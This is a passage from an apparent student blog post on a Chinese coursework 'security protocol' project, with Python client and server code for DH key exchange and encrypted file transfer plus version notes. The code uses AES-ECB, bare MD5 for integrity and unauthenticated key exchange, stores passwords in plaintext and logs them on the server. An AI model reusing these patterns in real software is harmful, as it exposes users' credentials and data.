self.progressBar.setValue((i/(sliced_sum-1))*100) QApplication.processEvents() self.pushButton_2.setText(&quot;再次发送&quot;) QMessageBox.information(None,&quot;输出信息&quot;,&quot;信息发送成功&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) def end_transfer(self,s): s.send(b&quot;&quot;) self.close()class registerwindow(QMainWindow,registerwindow): def __init__(self,s,shared_key,main_window): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) b1 = self.pushButton.clicked.connect(lambda:self.register(s,shared_key,main_window)) b2 = self.pushButton_2.clicked.connect(lambda:self.return_mainwindow()) def register(self,s,shared_key,main_window): username = self.lineEdit.text() password = self.lineEdit_2.text() if len(username) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) return else: password = self.lineEdit_2.text() if len(password) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) return data = username+&quot;;&quot;+password transfer_data = pack_data(3,data,shared_key,0,0) s.send(transfer_data) text = s.recv(1024).decode() if &quot;成功&quot; in text: QMessageBox.information(None,&quot;输出信息&quot;,&quot;用户注册成功&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) elif &quot;存在&quot; in text: QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户已存在&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) else: QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) def return_mainwindow(self): self.close()def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() if isinstance(data,str): data = data.encode() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,data,shared_key,sliced,sum): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,data) hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(ipaddr,ip_window): #交换公钥 # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ipaddr,6666)) except Exception as e: QMessageBox.information(None,&quot;报错信息&quot;,str(e),QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) public_key_server = serialization.load_pem_public_key(public_key_server) shared_key = private_key_client.exchange(public_key_server) login_window = loginwindow(s,shared_key) ip_window.close() login_window.show()def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() data_bytes = pad(data, AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key,username,password,login_window): data = username+&quot;;&quot;+password transfer_data = encrypt_data(shared_key,data) #使用aes加密账号密码 s.send(transfer_data) text = (s.recv(1024)).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) s.close() exit() elif text == &quot;密码错误，终止连接&quot;: QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) s.close() exit() else: main_window = mainwindow(s,shared_key) login_window.close() main_window.show() def register(s,shared_key,main_window): register_window = registerwindow(s,shared_key,main_window) register_window.show()def transfer_txt(s,shared_key,main_window): text = main_window.textEdit.toPlainText() if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum) s.send(transfer_data) main_window.textBrowser.append(&quot;文本数据传输成功&quot;)def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key,main_window): file_addr = main_window.textEdit.toPlainText() file_addr = file_addr.replace(&quot;file:///&quot;,&quot;&quot;) with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() transfer_data = [] if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): sliced += 1 transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum)) text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot; bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window) bar_window.show() else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum) text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot; bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window) bar_window.show() def main(): app = QApplication() ip_window = ipwindow() ip_window.show() app.exec()if __name__ == &quot;__main__&quot;: main() v1.1这个版本主要是继续增加一些功能1.原本的只是简单的实现客户端向服务端传输数据 并且ui的设计中上半部分显然也是预留给双端通讯(以服务端为媒介 客户机a与客户机b实时通讯)的 缺乏了这个功能总感觉有点遗憾2.登录和注册界面的功能也不是特别完善 再加上每次运行程序都需要重新输入ip地址和账号密码感觉不是特别方便 所以考虑优化一下这些东西3.作为一个合格的协议 目前还缺少的一点就是数字签名部分 需要提供不可抵赖性 证明消息是由对应客户机发送的 而非被劫持后的第二点的实现比较简单 稍微更改一下login.ui和ip_connect.ui和对应的类就可以了要实现第一点的话 就要对目前的ui界面进行大改动了 而且还要给服务端增加处理与好友私聊以及群聊的功能 客户端这边也要处理好发送和接收 感觉是一个比较大的工程总结下为了实现第一点需要去补充的功能1.客户端新增好友功能 以登录时的username为账号 添加好友(或者干脆不做这个 实现起来没啥必要)后可以进行通讯第一点的实现问题在于 如果客户端B离线 那么服务端那边就需要缓存A传输给B的数据 然后在B上线后发送给B如果两者都在线的情况 如何处理好数据的转发也是一种难题 毕竟现在的代码就因为高频的send和recv的时候会因为网络延迟导致丢包 偷懒没有去写处理丢包的逻辑 而是人为控制客户端发包的速率来解决这个问题 本来速率就比较慢了 如果这个时候还需要把数据从服务端发送给客户端B 这个时间就比较久了 没办法实现实时通讯按理来说 解决这一个方法也比较简单 大概可以从两个方面来实现(1)加一个检测丢包的机制 如果发现丢包就重传(2)经过测试 如果是一个体型较小的文件传输程序 是可以做到快速传输的 不需要手动添加发包延迟也可以 所以如果在传输大数据前新分配一个线程专门负责 会不会改善网络延迟、丢包的影响2.服务端需要和数据库进行交互来记录不同用户之间的好友列表 还要写添加好友的功能3.ui界面需要进行更新 这里依然是偷懒的选择抄袭qq的聊天界面 打算再原本左侧的选项栏的右边增加选择在哪个频道(群聊or私聊)发送消息如果把上面提到的全部解决 这会是一个庞大的工程量 接下来优先解决丢包重传的问题然后还有一点最关键的就是 如果想要实现一个基本的通讯软件的功能 即文件文本同时传输 例如表情包加文字的情况 那还需要优化服务端 需要把对于每一个数据包的data_type都进行校验 优化数据包传输这一点的优化原本是打算更改一下程序现有的逻辑目前是 如果是无切片情况 那么就根据数据包中的data_byte来决定处理函数如果是切片情况 先处理第一个切片的data_byte 然后选择处理函数那么切片情况的处理就比较不理想了 如果攻击者伪造第一个包的data_type 就有可能导致服务端进入错误的处理函数 导致负责的进程陷入死机 所以理想情况应该是 服务端先接收所有的包 然后再根据每个包的data_type来分别处理然后就是如果是单线程处理切片数据的话 会比较慢 往往传输完毕后过个几十秒才能把数据全部处理完所以打算给处理数据的也加一个线程池 最多10个线程来同时处理同时新增了重传机制 当服务端接收到了大小不满足一个切片长的数据包(除开最后一个数据包) 就会向客户端发送重传请求 客户端接收到后 就会从错误切片编号开始重新传输客户端 import socketimport structimport hashlibimport timeimport osfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom PySide6.QtWidgets import *from Crypto.Cipher import AESfrom ip_connect import ipwindowfrom login import loginwindowfrom main import mainwindowfrom progressbar import barwindowfrom register import registerwindowclass ipwindow(QMainWindow,ipwindow): def __init__(self): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) with open(&quot;tempfile/ip.txt&quot;,&quot;r&quot;) as file: ipaddr = file.read() if len(ipaddr) != 0: self.lineEdit.setText(ipaddr) self.checkBox.setChecked(True) l1 = self.lineEdit.returnPressed.connect(lambda:self.ip_connect()) b1 = self.pushButton.clicked.connect(lambda:self.ip_connect()) def ip_connect(self): if self.checkBox.isChecked(): with open(&quot;tempfile/ip.txt&quot;,&quot;w&quot;) as file: ipaddr = self.lineEdit.text() file.write(ipaddr) else: with open(&quot;tempfile/ip.txt&quot;,&quot;w&quot;) as file: file.write(&quot;&quot;) ipaddr = self.lineEdit.text() key_switch(ipaddr,self) class loginwindow(QMainWindow,loginwindow): def __init__(self,s,shared_key): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Password) with open(&quot;tempfile/user.txt&quot;,&quot;r&quot;) as file: user_info = file.read() if len(user_info) != 0: self.lineEdit.setText(user_info.split(&quot;;&quot;)[0]) self.lineEdit_2.setText(user_info.split(&quot;;&quot;)[1]) self.checkBox_2.setChecked(True) b1 = self.pushButton.clicked.connect(lambda:self.login(s,shared_key)) b2 = self.pushButton_2.clicked.connect(lambda:self.return_ipconnect()) l1 = self.lineEdit.returnPressed.connect(lambda:self.move_focus(self.lineEdit_2)) l2 = self.lineEdit_2.returnPressed.connect(lambda:self.login(s,shared_key)) c1 = self.checkBox.stateChanged.connect(lambda:self.hide_password()) def hide_password(self): if self.checkBox.isChecked(): self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Normal) else: self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Password) def move_focus(self,lineEdit): lineEdit.setFocus() def return_ipconnect(self): self.close() ip_window = ipwindow() ip_window.show() def login(self,s,shared_key): if self.checkBox_2.isChecked(): username = self.lineEdit.text() password = self.lineEdit_2.text() with open(&quot;tempfile/user.txt&quot;, &quot;w&quot;) as file: file.write(username + &quot;;&quot; + password) else: with open(&quot;tempfile/user.txt&quot;,&#x27;w&#x27;) as file: file.write(&quot;&quot;) username = self.lineEdit.text() if len(username) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) else: password = self.lineEdit_2.text() if len(password) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) else: Authentication(s,shared_key,username,password,self) class mainwindow(QMainWindow,mainwindow): def __init__(self,s,shared_key): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) self.current_number = 1 self.pushButton.setStyleSheet(&quot;background-color: grey;&quot;) self.textEdit.dropEvent = self.dropEvent b1 = self.pushButton.clicked.connect(lambda:self.choose_mode(1,s,shared_key)) b2 = self.pushButton_2.clicked.connect(lambda:self.choose_mode(2,s,shared_key)) b3 = self.pushButton_3.clicked.connect(lambda:self.choose_mode(3,s,shared_key)) b4 = self.pushButton_4.clicked.connect(lambda:self.return_ipconnect()) b5 = self.pushButton_5.clicked.connect(lambda:self.handle_send(s,shared_key)) b6 = self.pushButton_6.clicked.connect(lambda:self.clear_text()) b7 = self.pushButton_7.clicked.connect(lambda:self.edit_userprofile()) b9 = self.pushButton_9.clicked.connect(lambda:self.clear_log()) t1 = self.toolButton.clicked.connect(lambda:self.open_file()) def edit_userprofile(self): #尚未施工 exit() def dropEvent(self,event): files = event.mimeData().urls() file_addr = files[0].toLocalFile() if self.current_number == 1: with open(file_addr,&#x27;r&#x27;) as file: text = file.read() self.textEdit.setText(text) elif self.current_number == 2: self.textEdit.setText(file_addr) def open_file(self): file_addr = QFileDialog.getOpenFileName(None,&quot;选择文件&quot;,&quot;F:\\作业\\python程序&quot;,&quot;所有文件(*);&quot;) if self.current_number == 2: self.textEdit.setText(file_addr[0]) else: with open(file_addr[0],&#x27;r&#x27;) as file: text = file.read() self.textEdit.setText(text) def clear_log(self): self.textBrowser.clear() def return_ipconnect(self): self.close() ip_window = ipwindow() ip_window.show() def clear_text(self): self.textEdit.clear() def choose_mode(self,mode,s,shared_key): self.current_number = mode if mode == 1: self.pushButton.setStyleSheet(&quot;background-color: grey;&quot;) self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) elif mode ==2: self.pushButton_2.setStyleSheet(&quot;background-color: grey;&quot;) self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) elif mode ==3: self.pushButton_3.setStyleSheet(&quot;background-color: grey;&quot;) self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) register(s,shared_key,self) def handle_send(self,s,shared_key): if self.current_number == 1: transfer_txt(s,shared_key,self) elif self.current_number == 2: transfer_file(s,shared_key,self) class barwindow(QMainWindow,barwindow): def __init__(self,text,sliced_sum,transfer_data,s,main_window,full_name): QMainWindow.__init__(self) self.setupUi(self) self.progressBar.setValue(0) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) l1 = self.label.setText(text) b1 = self.pushButton_2.clicked.connect(lambda:self.start_transfer(sliced_sum,transfer_data,s,main_window,full_name)) b2 = self.pushButton.clicked.connect(lambda:self.end_transfer(s)) def start_transfer(self,sliced_sum,transfer_data,s,main_window,full_name): a_time = time.time() for i in range(sliced_sum): s.sendall(transfer_data[i]) self.progressBar.setValue((i/(sliced_sum-1))*100) QApplication.processEvents() count = 0 while 1: #设置最大连接时间为2s 用来接收服务端的重传请求 如果数据无误则过2s提示传输成功 try: s.settimeout(2.0) text = s.recv(1024).decode() if &quot;重传&quot; in text: self.progressBar.setValue(0) count += 1 information = f&quot;传输出现丢包 需要进行重传\\n当前重传次数:&#123;count&#125;&quot; self.label.setText(information) start = text.find(&quot;[&quot;)+1 end = text.find(&quot;]&quot;) number = text[start:end] number = int(number,10) for i in range(number-1,sliced_sum): s.sendall(transfer_data[i]) self.progressBar.setValue((i/(sliced_sum-1))*100) QApplication.processEvents() except socket.timeout: break finally: s.settimeout(None) b_time = time.time() self.pushButton_2.setText(&quot;再次发送&quot;) QMessageBox.information(None,&quot;输出信息&quot;,f&quot;文件发送成功\\n耗时&#123;b_time-a_time:.2f&#125;s&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) main_window.textBrowser.append(f&quot;&#123;full_name&#125;传输成功&quot;) def end_transfer(self,s): s.send(b&quot;&quot;) self.close()class registerwindow(QMainWindow,registerwindow): def __init__(self,s,shared_key,main_window): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) b1 = self.pushButton.clicked.connect(lambda:self.register(s,shared_key,main_window)) b2 = self.pushButton_2.clicked.connect(lambda:self.return_mainwindow()) def register(self,s,shared_key,main_window): username = self.lineEdit.text() password = self.lineEdit_2.text() if len(username) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) return else: password = self.lineEdit_2.text() if len(password) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) return data = username+&quot;;&quot;+password transfer_data = pack_data(3,data,shared_key,0,0) s.send(transfer_data) text = s.recv(1024).decode() if &quot;成功&quot; in text: QMessageBox.information(None,&quot;输出信息&quot;,&quot;用户注册成功&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) elif &quot;存在&quot; in text: QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户已存在&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) else: QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) def return_mainwindow(self): self.close()def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() if isinstance(data,str): data = data.encode() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,data,shared_key,sliced,sum): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,data) hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(ipaddr,ip_window): #交换公钥 # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ipaddr,6666)) except Exception as e: QMessageBox.information(None,&quot;报错信息&quot;,str(e),QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) public_key_server = serialization.load_pem_public_key(public_key_server) shared_key = private_key_client.exchange(public_key_server) login_window = loginwindow(s,shared_key) ip_window.close() login_window.show()def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() data_bytes = pad(data, AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key,username,password,login_window): data = username+&quot;;&quot;+password transfer_data = encrypt_data(shared_key,data) #使用aes加密账号密码 s.send(transfer_data) text = (s.recv(1024)).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) s.close() exit() elif text == &quot;密码错误，终止连接&quot;: QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) s.close() exit() else: main_window = mainwindow(s,shared_key) login_window.close() main_window.show() def register(s,shared_key,main_window): register_window = registerwindow(s,shared_key,main_window) register_window.show()def transfer_txt(s,shared_key,main_window): text = main_window.textEdit.toPlainText() if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) else : sliced = 1 sliced_sum = 1 transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum) s.send(transfer_data) main_window.textBrowser.append(&quot;文本数据传输成功&quot;)def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key,main_window): file_addr = main_window.textEdit.toPlainText() file_addr = file_addr.replace(&quot;file:///&quot;,&quot;&quot;) with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() file_name, file_extension = os.path.splitext(os.path.basename(file_addr)) full_name = file_name+file_extension transfer_data = [] if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): sliced += 1 transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum)) text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot; bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window,full_name) bar_window.show() else: sliced = 1 sliced_sum = 1 transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum) text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot; bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window,full_name) bar_window.show() def main(): app = QApplication() ip_window = ipwindow() ip_window.show() app.exec()if __name__ == &quot;__main__&quot;: main() 服务端 import socketimport hashlibimport magicimport timefrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3from concurrent.futures import ThreadPoolExecutorimport threadingmime = magic.Magic(mime=True)def write_log(log_file,text): current_time = time.asctime(time.localtime(time.time())) text += &quot; &quot;+current_time log_file.write(text.encode()+b&quot;\\n&quot;)class query_thread(threading.Thread): def __init__(self,name = None): threading.Thread.__init__(self,name=name) def query_username(self,username): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() cursor.close() return result def query_password(self,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password)) result = cursor.fetchone() cursor.close() return result def add_user(self,sock,username,password,addr,login_username,log_file): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (str(username), str(password))) conn.commit() except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;已存在,注册失败&quot;) text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)失败 因为用户已存在&quot; write_log(log_file,text) except Exception as e: sock.send(e.encode()) sock.send(&quot;用户注册成功&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;) text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot; write_log(log_file,text)def md5_encrypt(data): if isinstance(data, str): data = data.encode() # md5加密需要bytes参数 md5_hash = hashlib.md5() #md5加密 md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(sock,public_key_server): print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;) try: public_key_client = sock.recv(1024) except Exception as e: print(&quot;接受错误&quot;,e) public_key_bytes = public_key_server.public_bytes( #将客户端的公钥序列化为 PEM 格式的字节串 encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象def decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)) return datadef unpack_data(shared_key,orign_data): #拆解数据包 sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) value = verify_md5(data,data_md5) if value == False: fail_number = sliced_num else: fail_number = None return sliced_sum,sliced_num,data_type,data,fail_numberdef Authentication(sock,shared_key,query_thread1,addr,log_file): #身份验证部分 账号密码存储在users.db数据库中 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) en_data = (sock.recv(1024)) if len(en_data) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return data = decrypt_data(shared_key,en_data) parts = data.split(b&#x27;;&#x27;) username = parts[0].decode() password = parts[1].decode() result = query_thread1.query_username(username) if result != None: result = query_thread1.query_password(username,password) if result != None: sock.send(&quot;身份验证通过&quot;.encode()) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot; write_log(log_file,text) return permission_value,username else : sock.send(&quot;密码错误，终止连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot; write_log(log_file,text) sock.close() return 3,username else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot; write_log(log_file,text) sock.close() return 3,usernamedef transfer_txt(addr,data,log_file): print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;) text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot; write_log(log_file,text)def transfer_file(sock,data,addr,log_file): #处理非切片数据 data_type = mime.from_buffer(data) filename = &quot;output/&quot;+addr try: if data_type == &quot;text/plain&quot;: filename += &quot;.txt&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) else : print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机&#123;addr&#125;保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode())def transfer_file2(sock,data_bytes,addr,log_file,fail_array): #处理切片数据 if len(fail_array)&gt;0: fail_meg = &quot;,&quot;.join(fail_array) print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125; 数据疑似遭到篡改&quot;) text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot; write_log(log_file,text) sock.close() return else: print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;) data_type = mime.from_buffer(data_bytes) filename = &quot;output/&quot;+addr try: if data_type == &quot;image/png&quot;: filename += &quot;.png&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;audio/mpeg&quot;: filename += &quot;.mp3&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) else: print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; 